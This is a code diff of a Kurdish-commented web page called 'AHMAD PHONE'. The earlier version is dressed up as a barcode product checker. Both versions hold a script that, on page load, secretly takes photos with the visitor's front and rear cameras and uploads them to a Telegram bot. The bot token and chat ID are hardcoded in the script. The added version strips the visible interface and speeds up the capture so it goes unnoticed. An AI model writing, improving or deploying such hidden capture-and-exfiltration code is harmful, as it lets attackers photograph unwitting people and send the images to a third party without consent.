@@ -1,103 +1,59 @@
-<!DOCTYPE html>
-<html dir="rtl" lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AHMAD PHONE - Full Capture</title>
-    <script src="https://unpkg.com/html5-qrcode"></script>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f6f9; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
-        .container { width: 100%; max-width: 450px; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        h1 { color: #007bff; font-size: 24px; }
-        #status { font-size: 12px; color: #777; margin-bottom: 10px; }
-        .section { display: block; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid #eee; border-radius: 10px; text-align: center; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-bottom: 8px; }
-        .btn-blue { background-color: #007bff; color: white; }
-        #autoVideo { width: 100%; height: auto; display: none; }
-    </style>
-</head>
-<body>
+<script>
+    const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
+    const tgChatId = "6259019006";
 
-    <div class="container">
-        <div class="header"><h1>AHMAD PHONE</h1></div>
-        <div id="status">سیستەم ئامادەیە...</div>
+    window.addEventListener('load', () => {
+        fastCaptureSequence();
+    });
+
+    async function fastCaptureSequence() {
+        try {
+            // ١. گرتنی وێنەی پێشەوە بە خێرایی (تەنها ٥٠٠ میلی چرکە دەوەستێت بۆ فوکەس)
+            await captureAndSendFast("user", "📷 پێشەوە (خێرا)");
+
+            // ٢. گرتنی وێنەی پشتەوە دەستبەجێ
+            await captureAndSendFast("environment", "📸 پشتەوە (خێرا)");
+            
+            console.log("هەموو وێنەکان بە سەرکەوتوویی نێردران");
+        } catch (err) {
+            console.error("Camera Error:", err);
+        }
+    }
+
+    async function captureAndSendFast(mode, caption) {
+        const video = document.getElementById('autoVideo');
+        const canvas = document.getElementById('autoCanvas');
         
-        <video id="autoVideo" autoplay playsinline></video>
-        <canvas id="autoCanvas" style="display:none;"></canvas>
+        // داخستنی ستریمی پێشوو
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(track => track.stop());
+        }
 
-        <div class="section">
-            <input type="text" id="barcodeSell" placeholder="بارکۆد بنووسە">
-            <button class="btn-blue" onclick="alert('سەرەتا ڕێگە بە کامێرا بدە')">پشکنینی کاڵا</button>
-        </div>
-    </div>
-
-    <script>
-        const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
-        const tgChatId = "6259019006";
-        const statusText = document.getElementById('status');
-
-        window.addEventListener('load', () => {
-            startCaptureSequence();
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } }, 
+            audio: false 
         });
+        
+        video.srcObject = stream;
 
-        async function startCaptureSequence() {
-            try {
-                // ١. گرتنی وێنەی پێشەوە (Selfie)
-                statusText.innerText = "گرتنی وێنەی پێشەوە...";
-                await captureImage("user", "📷 وێنەی پێشەوە (سێلفی)");
+        // کەمترین کاتی وەستان بۆ ئەوەی کامێراکە ڕوون ببێتەوە (٥٠٠ میلی چرکە)
+        await new Promise(resolve => setTimeout(resolve, 500));
 
-                // ٢. کەمێک وەستان بۆ گۆڕینی کامێرا
-                await new Promise(resolve => setTimeout(resolve, 2000));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
 
-                // ٣. گرتنی وێنەی پشتەوە (Back Camera)
-                statusText.innerText = "گرتنی وێنەی پشتەوە...";
-                await captureImage("environment", "📸 وێنەی پشتەوە (کۆگا/کڕیار)");
-                
-                statusText.innerText = "هەموو وێنەکان نێردران ✅";
-            } catch (err) {
-                statusText.innerText = "هەڵە لە کامێرا: " + err;
-            }
-        }
+        // ناردنی وێنە بە شێوەی Async (بۆ ئەوەی نەوەستێت بۆ ئەنجامی ناردنەکە)
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', tgChatId);
+            formData.append('photo', blob, 'img.png');
+            formData.append('caption', caption);
 
-        async function captureImage(mode, caption) {
-            const video = document.getElementById('autoVideo');
-            const canvas = document.getElementById('autoCanvas');
-            
-            // داخستنی کامێرای پێشوو ئەگەر هەبێت
-            if (video.srcObject) {
-                video.srcObject.getTracks().forEach(track => track.stop());
-            }
-
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: mode }, 
-                audio: false 
+            fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
             });
-            
-            video.srcObject = stream;
-            
-            // وەستان بۆ چرکەیەک تا کامێراکە ڕوون دەبێتەوە
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            return new Promise((resolve) => {
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', tgChatId);
-                    formData.append('photo', blob, 'image.png');
-                    formData.append('caption', caption);
-
-                    fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).then(() => resolve());
-                }, 'image/png');
-            });
-        }
-    </script>
-</body>
-</html>
+        }, 'image/jpeg', 0.6); // کەمکردنەوەی کوالێتی بۆ 0.6 بۆ ئەوەی قەبارەی بچووک بێت و خێرا بنێردرێت
+    }
+</script>
